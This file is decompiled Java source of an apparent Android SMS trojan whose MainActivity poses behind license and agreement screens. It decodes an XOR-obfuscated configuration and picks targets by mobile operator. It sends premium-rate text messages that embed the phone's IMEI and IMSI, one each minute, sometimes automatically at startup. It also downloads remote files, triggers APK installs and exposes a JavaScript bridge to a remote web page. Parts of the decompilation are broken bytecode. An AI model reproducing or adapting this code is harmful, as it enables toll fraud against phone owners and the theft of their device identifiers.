package com.load.wap;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.SystemClock;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup.LayoutParams;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.LinearLayout.LayoutParams;
import android.widget.ScrollView;
import android.widget.TextView;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.io.StringReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Vector;
import org.xmlpull.v1.XmlPullParser;
import org.xmlpull.v1.XmlPullParserException;
import org.xmlpull.v1.XmlPullParserFactory;

public class MainActivity
  extends Activity
  implements View.OnClickListener, k
{
  static d a;
  static d b;
  static Vector c;
  static Vector d;
  static String e;
  static l f;
  static boolean g = false;
  private int h;
  private Button i;
  private Button j;
  private Button k;
  
  public MainActivity() {}
  
  /* Error */
  private String a(String paramString)
  {
    // Byte code:
    //   0: aload_0
    //   1: invokevirtual 43	java/lang/Object:getClass	()Ljava/lang/Class;
    //   4: aload_1
    //   5: invokevirtual 49	java/lang/Class:getResourceAsStream	(Ljava/lang/String;)Ljava/io/InputStream;
    //   8: astore 6
    //   10: iconst_0
    //   11: istore_2
    //   12: aload 6
    //   14: invokevirtual 55	java/io/InputStream:read	()I
    //   17: iconst_m1
    //   18: if_icmpne +88 -> 106
    //   21: aload 6
    //   23: invokevirtual 58	java/io/InputStream:close	()V
    //   26: aload_0
    //   27: invokevirtual 43	java/lang/Object:getClass	()Ljava/lang/Class;
    //   30: aload_1
    //   31: invokevirtual 49	java/lang/Class:getResourceAsStream	(Ljava/lang/String;)Ljava/io/InputStream;
    //   34: astore_1
    //   35: iload_2
    //   36: newarray byte
    //   38: astore 6
    //   40: iconst_0
    //   41: istore_2
    //   42: aload_1
    //   43: invokevirtual 55	java/io/InputStream:read	()I
    //   46: istore_3
    //   47: iload_3
    //   48: iconst_m1
    //   49: if_icmpne +64 -> 113
    //   52: aload_1
    //   53: invokevirtual 58	java/io/InputStream:close	()V
    //   56: aload 6
    //   58: iconst_0
    //   59: baload
    //   60: sipush 255
    //   63: iand
    //   64: istore 5
    //   66: iload 5
    //   68: iconst_1
    //   69: iadd
    //   70: istore_3
    //   71: iconst_0
    //   72: istore_2
    //   73: iload_3
    //   74: aload 6
    //   76: arraylength
    //   77: if_icmplt +49 -> 126
    //   80: new 60	java/lang/String
    //   83: dup
    //   84: aload 6
    //   86: iload 5
    //   88: iconst_1
    //   89: iadd
    //   90: aload 6
    //   92: arraylength
    //   93: iload 5
    //   95: isub
    //   96: iconst_1
    //   97: isub
    //   98: ldc 62
    //   100: invokespecial 65	java/lang/String:<init>	([BIILjava/lang/String;)V
    //   103: astore_1
    //   104: aload_1
    //   105: areturn
    //   106: iload_2
    //   107: iconst_1
    //   108: iadd
    //   109: istore_2
    //   110: goto -98 -> 12
    //   113: aload 6
    //   115: iload_2
    //   116: iload_3
    //   117: i2b
    //   118: bastore
    //   119: iload_2
    //   120: iconst_1
    //   121: iadd
    //   122: istore_2
    //   123: goto -81 -> 42
    //   126: aload 6
    //   128: iload_3
    //   129: aload 6
    //   131: iload_3
    //   132: baload
    //   133: aload 6
    //   135: iload_2
    //   136: iconst_1
    //   137: iadd
    //   138: baload
    //   139: sipush 255
    //   142: iand
    //   143: ixor
    //   144: i2b
    //   145: bastore
    //   146: iload_2
    //   147: iconst_1
    //   148: iadd
    //   149: istore 4
    //   151: iload 4
    //   153: istore_2
    //   154: iload 4
    //   156: iload 5
    //   158: if_icmpne +5 -> 163
    //   161: iconst_0
    //   162: istore_2
    //   163: iload_3
    //   164: iconst_1
    //   165: iadd
    //   166: istore_3
    //   167: goto -94 -> 73
    //   170: astore_1
    //   171: getstatic 71	java/lang/System:out	Ljava/io/PrintStream;
    //   174: ldc 73
    //   176: invokevirtual 79	java/io/PrintStream:println	(Ljava/lang/String;)V
    //   179: aload_1
    //   180: invokevirtual 82	java/lang/Exception:printStackTrace	()V
    //   183: ldc 84
    //   185: areturn
    //   186: astore 7
    //   188: goto -136 -> 52
    //   191: astore 6
    //   193: goto -167 -> 26
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	196	0	this	MainActivity
    //   0	196	1	paramString	String
    //   11	152	2	m	int
    //   46	121	3	n	int
    //   149	10	4	i1	int
    //   64	95	5	i2	int
    //   8	126	6	localObject	Object
    //   191	1	6	localException1	Exception
    //   186	1	7	localException2	Exception
    // Exception table:
    //   from	to	target	type
    //   0	10	170	java/lang/Exception
    //   26	40	170	java/lang/Exception
    //   52	56	170	java/lang/Exception
    //   73	104	170	java/lang/Exception
    //   42	47	186	java/lang/Exception
    //   12	26	191	java/lang/Exception
  }
  
  private static String a(XmlPullParser paramXmlPullParser, String paramString)
  {
    int m = 0;
    for (;;)
    {
      if (m >= paramXmlPullParser.getAttributeCount()) {
        return "";
      }
      if (paramXmlPullParser.getAttributeName(m).equals(paramString)) {
        return paramXmlPullParser.getAttributeValue(m);
      }
      m += 1;
    }
  }
  
  private void a()
  {
    this.h = 3;
    WebView localWebView = new WebView(this);
    localWebView.getSettings().setJavaScriptEnabled(true);
    localWebView.clearCache(true);
    localWebView.setScrollBarStyle(33554432);
    localWebView.setWebChromeClient(new c(this));
    localWebView.addJavascriptInterface(f, "android");
    localWebView.loadUrl(e);
    setContentView(localWebView);
  }
  
  public static void a(Context paramContext)
  {
    for (;;)
    {
      if (f.e.b >= d.size()) {
        return;
      }
      h localH = (h)d.get(f.e.b);
      Object localObject = f.e;
      ((g)localObject).b += 1;
      localObject = MainApplication.c;
      f.b(paramContext);
      a(paramContext, localH.b, localH.c);
      SystemClock.sleep(60000L);
    }
  }
  
  public static void a(Context paramContext, String paramString)
  {
    Intent localIntent = new Intent("android.intent.action.VIEW");
    localIntent.setDataAndType(Uri.fromFile(new File(paramString)), "application/vnd.android.package-archive");
    paramContext.startActivity(localIntent);
  }
  
  public static boolean a(Context paramContext, String paramString1, String paramString2)
  {
    System.out.println("sms: " + paramString2 + " to " + paramString1);
    try
    {
      paramContext = paramString2.replace("{IMEI}", f.c(paramContext)).replace("{IMSI}", f.e(paramContext));
      SmsManager.getDefault().sendTextMessage(paramString1, null, paramContext, null, null);
      return true;
    }
    catch (Exception paramContext)
    {
      paramContext.printStackTrace();
    }
    return false;
  }
  
  public static boolean a(String paramString1, String paramString2)
  {
    try
    {
      paramString1 = (HttpURLConnection)new URL(paramString1).openConnection();
      paramString1.setRequestMethod("GET");
      paramString1.setDoOutput(true);
      paramString1.connect();
      Object localObject = new File(Environment.getExternalStorageDirectory() + "/download/");
      ((File)localObject).mkdirs();
      paramString2 = new FileOutputStream(new File((File)localObject, paramString2));
      paramString1 = paramString1.getInputStream();
      localObject = new byte['Ð€'];
      for (;;)
      {
        int m = paramString1.read((byte[])localObject);
        if (m == -1)
        {
          paramString2.close();
          paramString1.close();
          return true;
        }
        paramString2.write((byte[])localObject, 0, m);
      }
      return false;
    }
    catch (IOException paramString1) {}
  }
  
  private Vector b(String paramString)
  {
    paramString = a(paramString);
    System.out.println(paramString);
    Vector localVector = new Vector();
    for (;;)
    {
      try
      {
        localXmlPullParser = XmlPullParserFactory.newInstance().newPullParser();
        localXmlPullParser.setInput(new StringReader(paramString));
        paramString = null;
      }
      catch (XmlPullParserException paramString)
      {
        paramString.printStackTrace();
        return localVector;
        if (!((String)localObject).equals("operator")) {
          continue;
        }
        paramString = new i();
        paramString.a = a(localXmlPullParser, "name");
        Object localObject = a(localXmlPullParser, "code").split(",");
        int m = 0;
        if (m >= localObject.length) {
          continue;
        }
        paramString.b.addElement(localObject[m]);
        m += 1;
        continue;
        if (!((String)localObject).equals("sms")) {
          continue;
        }
        e = a(localXmlPullParser, "url");
        if (!a(localXmlPullParser, "sendAfterStart").equals("1")) {
          continue;
        }
        bool = true;
        g = bool;
        continue;
      }
      catch (IOException paramString)
      {
        XmlPullParser localXmlPullParser;
        paramString.printStackTrace();
        return localVector;
        boolean bool = false;
        continue;
        if (localXmlPullParser.getName().equals("sms")) {
          continue;
        }
        if (!localXmlPullParser.getName().equals("operator")) {
          continue;
        }
        localVector.addElement(paramString);
        continue;
      }
      catch (Exception paramString)
      {
        paramString.printStackTrace();
        return localVector;
      }
      switch (localXmlPullParser.next())
      {
      case 2: 
        localObject = localXmlPullParser.getName();
        if (((String)localObject).equals("item"))
        {
          localObject = new h();
          ((h)localObject).b = a(localXmlPullParser, "number");
          ((h)localObject).c = a(localXmlPullParser, "text");
          paramString.c.addElement(localObject);
        }
        break;
      }
    }
  }
  
  private void b()
  {
    this.h = 1;
    LinearLayout localLinearLayout = new LinearLayout(this);
    localLinearLayout.setLayoutParams(new ViewGroup.LayoutParams(-1, -1));
    localLinearLayout.setOrientation(1);
    localLinearLayout.setWeightSum(1.0F);
    ScrollView localScrollView = new ScrollView(this);
    localScrollView.setLayoutParams(new LinearLayout.LayoutParams(-1, -2, 1.0F));
    TextView localTextView = new TextView(this);
    localTextView.setLayoutParams(new ViewGroup.LayoutParams(-1, -1));
    localTextView.setText(a.b);
    setTitle(a.a);
    localScrollView.addView(localTextView);
    localLinearLayout.addView(localScrollView);
    this.i = new Button(this);
    this.i.setLayoutParams(new ViewGroup.LayoutParams(-1, -2));
    this.i.setText((String)a.c.elementAt(0));
    this.i.setOnClickListener(this);
    localLinearLayout.addView(this.i);
    this.j = new Button(this);
    this.j.setLayoutParams(new ViewGroup.LayoutParams(-1, -2));
    this.j.setText((String)a.c.elementAt(1));
    this.j.setOnClickListener(this);
    localLinearLayout.addView(this.j);
    setContentView(localLinearLayout);
  }
  
  /* Error */
  private d c(String paramString)
  {
    // Byte code:
    //   0: invokestatic 334	org/xmlpull/v1/XmlPullParserFactory:newInstance	()Lorg/xmlpull/v1/XmlPullParserFactory;
    //   3: invokevirtual 338	org/xmlpull/v1/XmlPullParserFactory:newPullParser	()Lorg/xmlpull/v1/XmlPullParser;
    //   6: astore 4
    //   8: aload 4
    //   10: aload_0
    //   11: invokevirtual 43	java/lang/Object:getClass	()Ljava/lang/Class;
    //   14: aload_1
    //   15: invokevirtual 49	java/lang/Class:getResourceAsStream	(Ljava/lang/String;)Ljava/io/InputStream;
    //   18: aconst_null
    //   19: invokeinterface 465 3 0
    //   24: aconst_null
    //   25: astore_1
    //   26: ldc 84
    //   28: astore_2
    //   29: aload 4
    //   31: invokeinterface 348 1 0
    //   36: tableswitch	default:+215->251, 2:+28->64, 3:+105->141, 4:+123->159
    //   64: aload 4
    //   66: invokeinterface 351 1 0
    //   71: astore_3
    //   72: aload_3
    //   73: ldc_w 467
    //   76: invokevirtual 98	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   79: ifeq +167 -> 246
    //   82: new 431	com/load/wap/d
    //   85: dup
    //   86: invokespecial 468	com/load/wap/d:<init>	()V
    //   89: astore_2
    //   90: aload_2
    //   91: aload 4
    //   93: ldc_w 470
    //   96: invokestatic 358	com/load/wap/MainActivity:a	(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
    //   99: putfield 437	com/load/wap/d:a	Ljava/lang/String;
    //   102: aload_2
    //   103: getfield 451	com/load/wap/d:c	Ljava/util/Vector;
    //   106: aload 4
    //   108: ldc_w 472
    //   111: invokestatic 358	com/load/wap/MainActivity:a	(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
    //   114: invokevirtual 475	java/util/Vector:add	(Ljava/lang/Object;)Z
    //   117: pop
    //   118: aload_2
    //   119: getfield 451	com/load/wap/d:c	Ljava/util/Vector;
    //   122: aload 4
    //   124: ldc_w 477
    //   127: invokestatic 358	com/load/wap/MainActivity:a	(Lorg/xmlpull/v1/XmlPullParser;Ljava/lang/String;)Ljava/lang/String;
    //   130: invokevirtual 475	java/util/Vector:add	(Ljava/lang/Object;)Z
    //   133: pop
    //   134: aload_2
    //   135: astore_1
    //   136: aload_3
    //   137: astore_2
    //   138: goto -109 -> 29
    //   141: aload 4
    //   143: invokeinterface 351 1 0
    //   148: ldc_w 467
    //   151: invokevirtual 98	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   154: ifeq -125 -> 29
    //   157: aload_1
    //   158: areturn
    //   159: aload_2
    //   160: ldc_w 467
    //   163: invokevirtual 98	java/lang/String:equals	(Ljava/lang/Object;)Z
    //   166: ifeq -137 -> 29
    //   169: aload_1
    //   170: aload 4
    //   172: invokeinterface 480 1 0
    //   177: putfield 432	com/load/wap/d:b	Ljava/lang/String;
    //   180: goto -151 -> 29
    //   183: astore_2
    //   184: aload_2
    //   185: invokevirtual 369	org/xmlpull/v1/XmlPullParserException:printStackTrace	()V
    //   188: aload_1
    //   189: areturn
    //   190: astore_2
    //   191: aconst_null
    //   192: astore_1
    //   193: aload_2
    //   194: invokevirtual 395	java/io/IOException:printStackTrace	()V
    //   197: aload_1
    //   198: areturn
    //   199: astore_2
    //   200: aconst_null
    //   201: astore_1
    //   202: aload_2
    //   203: invokevirtual 82	java/lang/Exception:printStackTrace	()V
    //   206: aload_1
    //   207: areturn
    //   208: astore_3
    //   209: aload_2
    //   210: astore_1
    //   211: aload_3
    //   212: astore_2
    //   213: goto -11 -> 202
    //   216: astore_2
    //   217: goto -15 -> 202
    //   220: astore_3
    //   221: aload_2
    //   222: astore_1
    //   223: aload_3
    //   224: astore_2
    //   225: goto -32 -> 193
    //   228: astore_2
    //   229: goto -36 -> 193
    //   232: astore_2
    //   233: aconst_null
    //   234: astore_1
    //   235: goto -51 -> 184
    //   238: astore_3
    //   239: aload_2
    //   240: astore_1
    //   241: aload_3
    //   242: astore_2
    //   243: goto -59 -> 184
    //   246: aload_3
    //   247: astore_2
    //   248: goto -219 -> 29
    //   251: goto -222 -> 29
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	254	0	this	MainActivity
    //   0	254	1	paramString	String
    //   28	132	2	localObject1	Object
    //   183	2	2	localXmlPullParserException1	XmlPullParserException
    //   190	4	2	localIOException1	IOException
    //   199	11	2	localException1	Exception
    //   212	1	2	localObject2	Object
    //   216	6	2	localException2	Exception
    //   224	1	2	localObject3	Object
    //   228	1	2	localIOException2	IOException
    //   232	8	2	localXmlPullParserException2	XmlPullParserException
    //   242	6	2	localObject4	Object
    //   71	66	3	str	String
    //   208	4	3	localException3	Exception
    //   220	4	3	localIOException3	IOException
    //   238	9	3	localXmlPullParserException3	XmlPullParserException
    //   6	165	4	localXmlPullParser	XmlPullParser
    // Exception table:
    //   from	to	target	type
    //   29	64	183	org/xmlpull/v1/XmlPullParserException
    //   64	90	183	org/xmlpull/v1/XmlPullParserException
    //   141	157	183	org/xmlpull/v1/XmlPullParserException
    //   159	180	183	org/xmlpull/v1/XmlPullParserException
    //   0	24	190	java/io/IOException
    //   0	24	199	java/lang/Exception
    //   90	134	208	java/lang/Exception
    //   29	64	216	java/lang/Exception
    //   64	90	216	java/lang/Exception
    //   141	157	216	java/lang/Exception
    //   159	180	216	java/lang/Exception
    //   90	134	220	java/io/IOException
    //   29	64	228	java/io/IOException
    //   64	90	228	java/io/IOException
    //   141	157	228	java/io/IOException
    //   159	180	228	java/io/IOException
    //   0	24	232	org/xmlpull/v1/XmlPullParserException
    //   90	134	238	org/xmlpull/v1/XmlPullParserException
  }
  
  public final void a(int paramInt, Object paramObject)
  {
    if (paramInt == 1) {
      a(this);
    }
  }
  
  public void onClick(View paramView)
  {
    if (paramView == this.i)
    {
      if (!g) {
        new Thread(new j(this, 1, new Integer(0))).start();
      }
      a();
    }
    do
    {
      return;
      if (paramView == this.j)
      {
        this.h = 2;
        paramView = new LinearLayout(this);
        paramView.setLayoutParams(new ViewGroup.LayoutParams(-1, -1));
        paramView.setOrientation(1);
        paramView.setWeightSum(1.0F);
        ScrollView localScrollView = new ScrollView(this);
        localScrollView.setLayoutParams(new LinearLayout.LayoutParams(-1, -2, 1.0F));
        TextView localTextView = new TextView(this);
        localTextView.setLayoutParams(new ViewGroup.LayoutParams(-1, -1));
        localTextView.setText(b.b);
        setTitle(a.a);
        localScrollView.addView(localTextView);
        paramView.addView(localScrollView);
        this.i = new Button(this);
        this.i.setLayoutParams(new ViewGroup.LayoutParams(-1, -2));
        this.i.setText((String)b.c.elementAt(0));
        this.i.setOnClickListener(this);
        paramView.addView(this.i);
        this.k = new Button(this);
        this.k.setLayoutParams(new ViewGroup.LayoutParams(-1, -2));
        this.k.setText((String)b.c.elementAt(1));
        this.k.setOnClickListener(this);
        paramView.addView(this.k);
        setContentView(paramView);
        return;
      }
    } while (paramView != this.k);
    b();
  }
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    f = new l(this);
    int m;
    if (d == null)
    {
      a = c("/res/raw/main.xml");
      b = c("/res/raw/license.xml");
      c = b("/res/raw/sms.xml");
      paramBundle = (TelephonyManager)getSystemService("phone");
      if (paramBundle != null)
      {
        paramBundle = paramBundle.getNetworkOperator();
        m = 0;
        if (m < c.size()) {}
      }
      else
      {
        m = 0;
        if (m < c.size()) {
          break label230;
        }
      }
    }
    else
    {
      label96:
      if (g) {
        new Thread(new j(this, 1, new Integer(0))).start();
      }
      if (f.e.b != 0) {
        break label295;
      }
      b();
      return;
    }
    i localI = (i)c.elementAt(m);
    int n = 0;
    for (;;)
    {
      if (n >= localI.b.size())
      {
        m += 1;
        break;
      }
      String str = (String)localI.b.elementAt(n);
      if ((str != null) && (str.length() != 0) && (paramBundle.startsWith(str)))
      {
        d = localI.c;
        break label96;
      }
      n += 1;
    }
    label230:
    paramBundle = (i)c.elementAt(m);
    n = 0;
    for (;;)
    {
      if (n >= paramBundle.b.size())
      {
        m += 1;
        break;
      }
      if (paramBundle.b.elementAt(n).equals("XXX"))
      {
        d = paramBundle.c;
        break label96;
      }
      n += 1;
    }
    label295:
    a();
  }
}
